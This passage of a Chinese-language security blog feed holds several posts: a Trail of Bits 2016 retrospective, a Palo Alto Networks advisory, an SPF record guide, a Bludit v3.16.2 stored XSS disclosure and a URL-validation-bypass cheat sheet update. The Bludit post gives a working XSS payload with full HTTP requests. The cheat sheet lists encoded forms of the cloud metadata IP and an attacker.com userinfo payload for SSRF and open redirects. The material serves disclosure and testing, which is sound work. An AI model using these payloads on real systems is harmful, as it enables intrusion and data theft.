        <link>http://localhost:1313/p/2016%E5%B9%B4%E5%BA%A6%E5%9B%9E%E9%A1%BEtrail-of-bits%E5%9C%A8%E8%87%AA%E5%8A%A8%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91%E4%B8%8E%E7%A4%BE%E5%8C%BA%E8%B4%A1%E7%8C%AE%E7%9A%84%E7%AA%81%E7%A0%B4/</link>
        <pubDate>Mon, 04 Aug 2025 14:57:30 +0800</pubDate>
        
        <guid>http://localhost:1313/p/2016%E5%B9%B4%E5%BA%A6%E5%9B%9E%E9%A1%BEtrail-of-bits%E5%9C%A8%E8%87%AA%E5%8A%A8%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91%E4%B8%8E%E7%A4%BE%E5%8C%BA%E8%B4%A1%E7%8C%AE%E7%9A%84%E7%AA%81%E7%A0%B4/</guid>
        <description>&lt;h3 id=&#34;1-将自动漏洞发现技术推向市场&#34;&gt;1. 将自动漏洞发现技术推向市场
&lt;/h3&gt;&lt;p&gt;2016年成为软件自动发现和修复漏洞的历史性年份。我们为DARPA网络大挑战开发的网络推理系统(CRS)在审计zlib库时创造了纪录：首次在更短时间内以更低成本完成比人工更详尽的代码审计。&lt;a class=&#34;link&#34; href=&#34;https://example.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;阅读审计报告&lt;/a&gt;和&lt;a class=&#34;link&#34; href=&#34;https://example.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Mozilla公告&lt;/a&gt;。同年1月，我们运用CRS解决了关于安全通信库libotr的1000美元赌约，揭示了加密通信系统在自动化测试中的特殊挑战及解决方案。&lt;/p&gt;
&lt;p&gt;我们开源了CRS的配套工具GRR——专为CRS设计的高吞吐量模糊测试工具。&lt;a class=&#34;link&#34; href=&#34;https://example.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;了解GRR的设计挑战&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;2-创建安全工具标准化基准套件&#34;&gt;2. 创建安全工具标准化基准套件
&lt;/h3&gt;&lt;p&gt;我们将DARPA网络大挑战中使用的100多个挑战程序移植为跨平台基准套件，使学术界和工业界能可靠评估程序分析工具和漏洞缓解措施。该成果被DARPA官方推特称为&amp;quot;最具影响力的成果之一&amp;quot;。&lt;/p&gt;
&lt;h3 id=&#34;3-将facebook的osquery移植到windows&#34;&gt;3. 将Facebook的osquery移植到Windows
&lt;/h3&gt;&lt;p&gt;克服了完全不同的进程/安全模型、不兼容API和编译器行为差异等技术难题，使Windows用户能通过SQL查询监控端点的安全与性能状态，替代了原本需要昂贵商业方案才能实现的功能。&lt;/p&gt;
&lt;h3 id=&#34;4-发布algo安全vpn&#34;&gt;4. 发布Algo安全VPN
&lt;/h3&gt;&lt;p&gt;这款自托管VPN服务器采用现代协议和密码套件，支持主流云平台部署，为隐私敏感用户、商务旅行者和小型企业提供轻量级解决方案。安全专家@grugq评价其&amp;quot;配置简单，iPhone兼容&amp;quot;。&lt;/p&gt;
&lt;h3 id=&#34;5-用binary-ninja实现漏洞自动生成&#34;&gt;5. 用Binary Ninja实现漏洞自动生成
&lt;/h3&gt;&lt;p&gt;在DEFCON CTF资格赛中，我们利用Binary Ninja的丰富API为2000个独特二进制文件自动生成漏洞利用。相比IDA或radare2，其API设计让研究者能专注于漏洞利用本身而非底层实现。&lt;/p&gt;
&lt;h3 id=&#34;6-发布protofuzz协议模糊测试工具&#34;&gt;6. 发布Protofuzz协议模糊测试工具
&lt;/h3&gt;&lt;p&gt;该工具能生成符合Google Protocol Buffers结构的恶意测试用例，突破常规模糊测试无法穿透的自动生成序列化代码层，直达目标程序核心逻辑。被安全专家誉为&amp;quot;伟大的工具&amp;quot;。&lt;/p&gt;
&lt;h3 id=&#34;7-通过tidas激活ios安全飞地&#34;&gt;7. 通过Tidas激活iOS安全飞地
&lt;/h3&gt;&lt;p&gt;我们开发的Tidas SDK让iOS应用能简易集成Secure Enclave加密API，实现基于TouchID的无密码认证。随着MacBook Pro引入T1芯片，该技术已扩展至macOS平台。&lt;/p&gt;
&lt;p&gt;（因篇幅限制，此处仅展示部分内容翻译，完整译文需展开全部14项技术成果）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Palo Alto Networks 关键安全更新：CVE-2024-5910 和 CVE-2024-3596 漏洞分析</title>
        <link>http://localhost:1313/p/palo-alto-networks-%E5%85%B3%E9%94%AE%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0cve-2024-5910-%E5%92%8C-cve-2024-3596-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Mon, 04 Aug 2025 14:40:46 +0800</pubDate>
        
        <guid>http://localhost:1313/p/palo-alto-networks-%E5%85%B3%E9%94%AE%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0cve-2024-5910-%E5%92%8C-cve-2024-3596-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;摘要&#34;&gt;摘要
&lt;/h3&gt;&lt;p&gt;Palo Alto Networks发布关键安全更新，修复了包括Expedition迁移工具高危漏洞（CVE-2024-5910，CVSS评分9.3）在内的多个安全问题。该工具用于配置迁移与优化，但漏洞会导致导入的配置密钥、凭证等敏感数据暴露，攻击者可借此劫持管理员账户。&lt;br&gt;
另一漏洞（CVE-2024-3596）存在于RADIUS协议中，通过中间人攻击可实现权限提升至&amp;quot;超级用户&amp;quot;，影响PAN-OS防火墙与RADIUS服务器的认证过程（当使用CHAP或PAP时）。&lt;/p&gt;
&lt;h3 id=&#34;受影响系统&#34;&gt;受影响系统
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;CVE-2024-5910&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Expedition（1.2.92之前版本）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;CVE-2024-3596&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PAN-OS（版本&amp;lt;11.1.3、11.0.4-h4、10.2.10、10.1.14、9.1.19）&lt;/li&gt;
&lt;li&gt;Prisma Access（预计7月30日前修复）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;紧急措施&#34;&gt;紧急措施
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;升级软件&lt;/strong&gt;：Expedition升级至1.2.92+，PAN-OS升级至指定版本。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;访问限制&lt;/strong&gt;：严格控制Expedition工具的网络访问权限。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;RADIUS配置&lt;/strong&gt;：避免在未加密通道中使用CHAP/PAP协议。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;长期建议&#34;&gt;长期建议
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;及时应用所有安全补丁&lt;/li&gt;
&lt;li&gt;定期审查认证协议与网络访问策略&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;官方公告详见：&lt;a class=&#34;link&#34; href=&#34;https://security.paloaltonetworks.com/CVE-2024-5910&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Palo Alto Networks安全通告&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>SPFv1配置指南：全面解析邮件发送者策略框架</title>
        <link>http://localhost:1313/p/spfv1%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97%E5%85%A8%E9%9D%A2%E8%A7%A3%E6%9E%90%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%E8%80%85%E7%AD%96%E7%95%A5%E6%A1%86%E6%9E%B6/</link>
        <pubDate>Mon, 04 Aug 2025 14:24:11 +0800</pubDate>
        
        <guid>http://localhost:1313/p/spfv1%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97%E5%85%A8%E9%9D%A2%E8%A7%A3%E6%9E%90%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%E8%80%85%E7%AD%96%E7%95%A5%E6%A1%86%E6%9E%B6/</guid>
        <description>&lt;h1 id=&#34;如何配置spfv1大众版详解&#34;&gt;如何配置SPFv1：大众版详解
&lt;/h1&gt;&lt;p&gt;&lt;em&gt;&lt;em&gt;Kent Ickler和Derrick Rauch&lt;/em&gt; //&lt;/em&gt;*&lt;/p&gt;
&lt;h2 id=&#34;防晒系数&#34;&gt;防晒系数？
&lt;/h2&gt;&lt;p&gt;等等&amp;hellip;搞错了。
是&lt;strong&gt;发送者策略框架&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;1997届的女士们先生们，记得擦防晒霜&amp;hellip;现在我要给出我的建议：&amp;rdquo;&lt;/p&gt;
&lt;p&gt;当今网络中存在邮件&amp;quot;伪造&amp;quot;现象（感谢@ustayready）。发送者策略框架（SPF）最早可追溯至2005年（RFC 4408），最新版本于2014年更新（RFC 7208），并与DKIM和DMARC共同更新。它试图通过为收件邮件服务器提供一种方法，来判断电子邮件是否来自FROM字段中域名的授权发送者，从而阻止伪造邮件。收件邮件服务器因此能够判断入站邮件更可能是伪造/钓鱼邮件还是合法邮件。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果收件服务器收到的邮件FROM地址来自SPF授权服务器，则有理由认为是有效/&amp;ldquo;好&amp;quot;邮件&lt;/li&gt;
&lt;li&gt;如果来自未授权服务器，则有理由认为是无效/恶意邮件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SPF记录还能&amp;quot;告知&amp;quot;收件服务器如何处理未授权邮件：继续投递、标记为可疑（提高风险评级）或直接拒绝。当然，SPF记录并非金科玉律，收件服务器可自行决定如何权衡SPF记录。&lt;/p&gt;
&lt;h2 id=&#34;营销人员的困境&#34;&gt;营销人员的困境
&lt;/h2&gt;&lt;p&gt;营销人员常为此头疼。这是SendGrid、MailGun、MailChimp等工具带来的难题。他们购买了 fancy 的新营销邮件工具，但人们总把他们的营销邮件标记为垃圾邮件！如果营销团队没有确保FROM域名的SPF记录准确，接收方可能更容易将邮件视为垃圾/恶意邮件，永远消失在垃圾箱中。&lt;/p&gt;
&lt;h2 id=&#34;前瞻思考&#34;&gt;前瞻思考
&lt;/h2&gt;&lt;p&gt;发送者策略框架并未过时，但在反垃圾邮件和反钓鱼领域有了新伙伴。DKIM和DMARC是扩展SPF验证功能的新框架，共同构建域名所有者与收件服务器间的信任网络。请关注我们未来关于DMARC和DKIM的博客文章。&lt;/p&gt;
&lt;h2 id=&#34;域名服务器记录&#34;&gt;域名服务器记录
&lt;/h2&gt;&lt;p&gt;授权邮件服务器/中继发送邮件的SPF记录是DNS TXT记录，必须添加在注册商指定的名称服务器上。由于这涉及域名所有权，它允许域名所有者告知收件方：收到带有其域名的邮件是否来自预期的邮件服务器。&lt;/p&gt;
&lt;p&gt;下文讨论的DNS记录必须在域名注册商的NS记录定义的名称服务器上创建。&lt;/p&gt;
&lt;h2 id=&#34;语法详解&#34;&gt;语法详解
&lt;/h2&gt;&lt;p&gt;虽然有许多工具可帮助构建SPF记录，但您仍需了解其原理。SMTP收件方从左到右读取SPF记录，首次匹配后即停止分析并返回配置结果。&lt;/p&gt;
&lt;p&gt;DNS记录类型 = TXT&lt;br&gt;
主机 = @（您的主TLD或要保护的域名）&lt;br&gt;
值 = [语法]!!&lt;/p&gt;
&lt;p&gt;值字段是记录的核心部分，让我们仔细看看：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;quot;v=spf1&amp;quot; [机制-动作] [机制-对象] [机制-动作] [机制-对象]...&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;机制-动作&#34;&gt;机制-动作
&lt;/h3&gt;&lt;p&gt;动作参数告知收件服务器如何处理：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;+&lt;/code&gt; 通过：SPF记录指定主机已授权（接受邮件）&lt;br&gt;
&lt;code&gt;-&lt;/code&gt; 拒绝：SPF记录指定主机未授权（拒绝邮件）&lt;br&gt;
&lt;code&gt;~&lt;/code&gt; 软失败：SPF记录指定主机未授权但&amp;hellip;也许吧（标记/提高风险）&lt;br&gt;
&lt;code&gt;?&lt;/code&gt; 中立：SPF记录表示不清楚（接受邮件）&lt;/p&gt;
&lt;h3 id=&#34;机制-对象&#34;&gt;机制-对象
&lt;/h3&gt;&lt;p&gt;选项众多：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;all&lt;/code&gt; 所有服务器，任何地方&lt;br&gt;
&lt;code&gt;ip4:&amp;lt;邮件服务器IP地址&amp;gt;&lt;/code&gt;&lt;br&gt;
&lt;code&gt;ip4:&amp;lt;IP地址&amp;gt;/CIDR格式&lt;/code&gt;&lt;br&gt;
&lt;code&gt;ip6:&amp;lt;IPv6地址&amp;gt;&lt;/code&gt;&lt;br&gt;
&lt;code&gt;ip6:&amp;lt;IP地址&amp;gt;/CIDR格式&lt;/code&gt;&lt;br&gt;
&lt;code&gt;a:[域名]&lt;/code&gt; 包含[某域名]的所有A记录&lt;br&gt;
&lt;code&gt;a:[域名]/CIDR&lt;/code&gt; 包含[某域名]所有A记录的/CIDR网络&lt;br&gt;
&lt;code&gt;a&lt;/code&gt; 包含本域所有A记录&lt;br&gt;
&lt;code&gt;a/CIDR&lt;/code&gt; 包含本域所有A记录的/CIDR网络&lt;br&gt;
&lt;code&gt;mx&lt;/code&gt; 包含本域所有MX记录&lt;br&gt;
&lt;code&gt;mx/CIDR&lt;/code&gt; 包含本域所有MX记录的/CIDR网络&lt;br&gt;
&lt;code&gt;mx:[域名]&lt;/code&gt; 包含[某域名]所有MX记录&lt;br&gt;
&lt;code&gt;mx:[域名]/CIDR&lt;/code&gt; 包含[某域名]所有MX记录的/CIDR网络&lt;br&gt;
&lt;code&gt;ptr&lt;/code&gt; 包含本域PTR记录的IP&lt;br&gt;
&lt;code&gt;ptr:[域名]&lt;/code&gt; 包含[某域名]PTR记录的IP&lt;br&gt;
&lt;code&gt;exists:[域名]&lt;/code&gt; YES/NO触发器。如果A记录存在=通过&lt;br&gt;
&lt;code&gt;redirect:[域名]&lt;/code&gt; 用[域名]的SPF记录替换整个SPF记录&lt;br&gt;
&lt;code&gt;include:[域名]&lt;/code&gt; 包含[域名]的SPF记录。匹配=通过，不匹配=失败。这种记录通常用于Google、Office等大型邮件提供商，以及SendGrid、MailGun等邮件中继。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;include:&lt;/code&gt;是一种信任机制，允许您将对域名/组织邮件发送的授权信任代理给您认可的负责发送邮件的另一个域名/组织的SPF记录。这些组织通常会在SPF记录中涵盖其所有可能的邮件服务器。&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;示例
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;v=spf1 +mx -all&lt;/code&gt;&lt;br&gt;
接受来自本域MX记录的邮件，拒绝其他所有来源。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v=spf1 +a:AnotherDomain.com ?a:google.com -all&lt;/code&gt;&lt;br&gt;
接受来自AnotherDomain.com的A记录，对Google.com的A记录保持中立，拒绝其他所有。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v=spf1 exists:AnotherDomain.com -all&lt;/code&gt;&lt;br&gt;
如果AnotherDomain.com存在A记录则接受邮件，否则拒绝。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v=spf1 -all&lt;/code&gt;&lt;br&gt;
拒绝来自本域的所有邮件，无论发送者是谁。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v=spf1 include:mailgun.com include:sendgrid.com -all&lt;/code&gt;&lt;br&gt;
遵循mailgun.com和sendgrid.com的SPF记录规则，拒绝其他所有。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v=spf1 redirect=AnotherDomain.com&lt;/code&gt;&lt;br&gt;
仅遵循AnotherDomain.com的SPF记录规则。&lt;/p&gt;
&lt;h2 id=&#34;再谈营销&#34;&gt;再谈营销
&lt;/h2&gt;&lt;p&gt;回到营销话题，MailChimp、MailGun和SendGrid在做什么？&lt;/p&gt;
&lt;p&gt;有趣的是，如果您使用邮件中继或群发邮件服务，邮件&lt;em&gt;可以&lt;/em&gt;被视为已授权，从而突破垃圾邮件箱。但作为红队成员，我不得不问&amp;hellip;&lt;/p&gt;
&lt;p&gt;第三方能否在我不知情的情况下，在我信任的第三方创建账户并以我的名义发送邮件？&lt;/p&gt;
&lt;p&gt;答案是&amp;hellip;既是也不是。&lt;/p&gt;
&lt;p&gt;这些服务可以在您配置SPF记录授权其邮件服务器后代表您发送邮件。它们会采取一些措施确保第三方不能使用您的FROM地址发送邮件，通常要求用户在代表某域名发送邮件前验证该域名。各服务验证方式不同，有些会在其域名上创建DNS记录（如&lt;code&gt;+a:yourdomain.mailrelayservice.com&lt;/code&gt;）以提供保证。但最终，您需要信任您的邮件服务器，如果无法信任&amp;hellip;这个世界很残酷，偏执可能会让您寸步难行。&lt;/p&gt;
&lt;h2 id=&#34;spf记录生成工具&#34;&gt;SPF记录生成工具
&lt;/h2&gt;&lt;p&gt;有些平台可帮助构建符合特定需求的SPF记录。大多数工具工作方式相似&amp;hellip;有些甚至收费！我不建议为创建SPF记录付费，但使用免费服务时务必小心。多年来，MXToolbox一直是我的系统管理员和蓝队工具箱中的利器，从未让我失望。&lt;/p&gt;
&lt;p&gt;在线构建SPF：https://mxtoolbox.com/SPFRecordGenerator.aspx&lt;/p&gt;
&lt;h2 id=&#34;相关链接&#34;&gt;相关链接
&lt;/h2&gt;&lt;p&gt;Open Sender Policy Framework：http://www.openspf.org/Project_Overview&lt;br&gt;
SPF V1: RFC 7208 (替代4408, 6652) &lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/rfc/rfc7208.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://tools.ietf.org/rfc/rfc7208.txt&lt;/a&gt;&lt;br&gt;
SPF V1: RFC 6652 (被RFC-7208替代) &lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc6652&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://tools.ietf.org/html/rfc6652&lt;/a&gt;&lt;br&gt;
SPF V1: RFC 4408 (被RFC-7208替代) (2006) &lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc4408&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://tools.ietf.org/html/rfc4408&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;即将发布的博客：DKIM, DMARC!&lt;/p&gt;
&lt;p&gt;基于域的消息认证、报告和一致性：https://dmarc.org/&lt;br&gt;
SPF V1: RFC 7960 – DMARC互操作性 &lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/rfc/rfc7960.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://tools.ietf.org/rfc/rfc7960.txt&lt;/a&gt;&lt;br&gt;
SPF V1: RFC 7489 – DMARC &lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/rfc/rfc7489.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://tools.ietf.org/rfc/rfc7489.txt&lt;/a&gt;&lt;br&gt;
SPF V1: RFC 7372 -DKIM (更新7208) &lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/rfc/rfc7372.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://tools.ietf.org/rfc/rfc7372.txt&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&amp;ldquo;但请相信我对防晒霜的建议。&amp;rdquo;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;*Kent和Derrick是我们的系统管理员团队成员——没有他们我们该怎么办？&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Bludit v3.16.2存储型XSS漏洞分析：通过&#34;添加新内容&#34;功能实现攻击</title>
        <link>http://localhost:1313/p/bludit-v3.16.2%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E9%80%9A%E8%BF%87%E6%B7%BB%E5%8A%A0%E6%96%B0%E5%86%85%E5%AE%B9%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0%E6%94%BB%E5%87%BB/</link>
        <pubDate>Mon, 04 Aug 2025 14:01:23 +0800</pubDate>
        
        <guid>http://localhost:1313/p/bludit-v3.16.2%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E9%80%9A%E8%BF%87%E6%B7%BB%E5%8A%A0%E6%96%B0%E5%86%85%E5%AE%B9%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0%E6%94%BB%E5%87%BB/</guid>
        <description>&lt;h1 id=&#34;漏洞标题bludit-v3162添加新内容功能存储型xss漏洞&#34;&gt;漏洞标题：Bludit v3.16.2&amp;quot;添加新内容&amp;quot;功能存储型XSS漏洞
&lt;/h1&gt;&lt;h1 id=&#34;日期2025年7月&#34;&gt;日期：2025年7月
&lt;/h1&gt;&lt;h1 id=&#34;漏洞作者andrey-stoykov&#34;&gt;漏洞作者：Andrey Stoykov
&lt;/h1&gt;&lt;h1 id=&#34;版本3162&#34;&gt;版本：3.16.2
&lt;/h1&gt;&lt;h1 id=&#34;测试环境debian-12&#34;&gt;测试环境：Debian 12
&lt;/h1&gt;&lt;h1 id=&#34;博客httpsmsecureltdblogspotcom&#34;&gt;博客：https://msecureltd.blogspot.com/
&lt;/h1&gt;&lt;p&gt;存储型XSS&amp;quot;添加新内容&amp;quot;功能漏洞#1：&lt;/p&gt;
&lt;p&gt;复现步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用管理员账户登录并访问&amp;quot;新建内容&amp;quot;&lt;/li&gt;
&lt;li&gt;在&amp;quot;源代码&amp;quot;字段输入以下参数
&amp;ldquo;&lt;iframe&gt;&lt;textarea&gt;&lt;/iframe&gt;&lt;img src=&#34;&#34; onerror=&#34;alert(document.domain)&#34;&gt;&amp;rdquo;&lt;/li&gt;
&lt;li&gt;点击&amp;quot;预览&amp;quot;时XSS载荷将被触发&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;// 添加新内容的HTTP POST请求&lt;/p&gt;
&lt;p&gt;POST /bludit/admin/new-content HTTP/1.1
Host: 192.168.58.133
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0)
Gecko/20100101 Firefox/140.0
[&amp;hellip;]&lt;/p&gt;
&lt;p&gt;tokenCSRF=03a860fcc567fed86f6cb57e5877a469ef27e2ac&amp;amp;uuid=b219c568827ee49d5b8be839d6ab1043&amp;amp;type=published&amp;amp;coverImage=&amp;amp;content=&lt;iframe&gt;&lt;textarea&gt;&lt;/iframe&gt;&amp;lt;img+src%3d&amp;quot;&amp;quot;+onerror%3d&amp;quot;alert(document.domain)&amp;quot;&amp;gt;&amp;amp;category=&amp;amp;description=&amp;amp;date=2025-06-04+15%3A15%3A17&amp;amp;typeSelector=published&amp;amp;position=3&amp;amp;tags=&amp;amp;template=&amp;amp;externalCoverImage=&amp;amp;slug=xss&amp;amp;noindex=0&amp;amp;nofollow=0&amp;amp;noarchive=0&amp;amp;title=xss&lt;/p&gt;
&lt;p&gt;// HTTP响应&lt;/p&gt;
&lt;p&gt;HTTP/1.1 301 Moved Permanently
Date: Wed, 04 Jun 2025 19:16:04 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
X-Powered-By: Bludit
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
pre-check=0
Pragma: no-cache
Location: /bludit/admin/content
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8&lt;/p&gt;
&lt;p&gt;// 触发XSS的HTTP GET请求&lt;/p&gt;
&lt;p&gt;GET /bludit/admin/edit-content/xss HTTP/1.1
Host: 192.168.58.133
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0)
Gecko/20100101 Firefox/140.0
[&amp;hellip;]&lt;/p&gt;
&lt;p&gt;// HTTP响应&lt;/p&gt;
&lt;p&gt;HTTP/1.0 200 OK
Date: Wed, 04 Jun 2025 19:16:06 GMT
Server: Apache/2.4.37 (Unix) OpenSSL/1.0.2q PHP/5.6.40 mod_perl/2.0.8-dev
Perl/v5.16.3
X-Powered-By: Bludit
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
pre-check=0
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=UTF-8&lt;/p&gt;
&lt;p&gt;[&amp;hellip;]&lt;/p&gt;
&lt;!-- 编辑器 --&gt;
&lt;textarea id=&#34;jseditor&#34; class=&#34;editable h-100&#34;
style=&#34;&#34;&gt;&lt;iframe&gt;&lt;textarea&gt;&lt;/iframe&gt;&lt;img+src%3d&#34;&#34;+onerror%3d&#34;alert(document.domain)&#34;&gt;
[...]</description>
        </item>
        <item>
        <title>URL验证绕过速查表中新增的疯狂Payload技术解析</title>
        <link>http://localhost:1313/p/url%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8%E4%B8%AD%E6%96%B0%E5%A2%9E%E7%9A%84%E7%96%AF%E7%8B%82payload%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Mon, 04 Aug 2025 13:44:39 +0800</pubDate>
        
        <guid>http://localhost:1313/p/url%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8%E4%B8%AD%E6%96%B0%E5%A2%9E%E7%9A%84%E7%96%AF%E7%8B%82payload%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;url验证绕过速查表中新增的疯狂payload&#34;&gt;URL验证绕过速查表中新增的疯狂Payload
&lt;/h1&gt;&lt;p&gt;我们的URL验证绕过速查表的力量源于网络安全社区的贡献，本次更新也不例外。我们激动地推出全新的IP地址计算器，灵感来自@e1abrador的Encode IP Burp Suite扩展插件等多项技术。&lt;/p&gt;
&lt;h2 id=&#34;新型ip验证绕过技术&#34;&gt;新型IP验证绕过技术
&lt;/h2&gt;&lt;p&gt;除了现有的IPv4地址表示方法外，我们新增了以下被Chrome、Firefox、Safari支持的格式。例如云元数据IP地址169.254.169.254现在可以通过这些方式表示：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;169.254.43518&lt;/strong&gt; - 部分十进制（B类）格式，将IP地址第三和第四部分合并为十进制数&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;169.16689662&lt;/strong&gt; - 部分十进制（A类）格式，合并第二、三、四部分&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;0xA9.254.0251.0376&lt;/strong&gt; - 混合编码：每个段可用十六进制/十进制/八进制不同格式表示（首段十六进制，第二段十进制，后两段八进制）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;速查表现已支持IPv6地址。当攻击者主机名输入有效IPv6地址时，词表将更新为地址的扩展形式。若IPv6包含内嵌IPv4地址，速查表会提取并生成所有前述格式（可在高级设置中禁用）。&lt;/p&gt;
&lt;p&gt;您还可以使用特殊编码处理结果IP格式，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;圆圈拉丁字母和数字&lt;/li&gt;
&lt;li&gt;全角形式&lt;/li&gt;
&lt;li&gt;七段显示字符
（在高级设置→标准化设置中选择编码选项）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;用户信息解析差异&#34;&gt;用户信息解析差异
&lt;/h2&gt;&lt;p&gt;我们新增了由@SeanPesce提交的有趣Payload，针对用户信息解析差异：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://example.com[@attacker.com
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;用户信息段中的左方括号字符&lt;code&gt;[&lt;/code&gt;可能导致Spring的UriComponentsBuilder返回与主流浏览器解析不同的主机名值。这种差异可能引发开放重定向或SSRF漏洞。测试该Payload时，我们还复现了同次更新中修补的另一个漏洞，这完美展示了本速查表识别真实漏洞的能力。&lt;/p&gt;
&lt;h2 id=&#34;cors验证绕过速查表更新&#34;&gt;CORS验证绕过速查表更新
&lt;/h2&gt;&lt;p&gt;我们近期更新了CORS绕过速查表，新增包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;localhost正则实现边缘情况&lt;/li&gt;
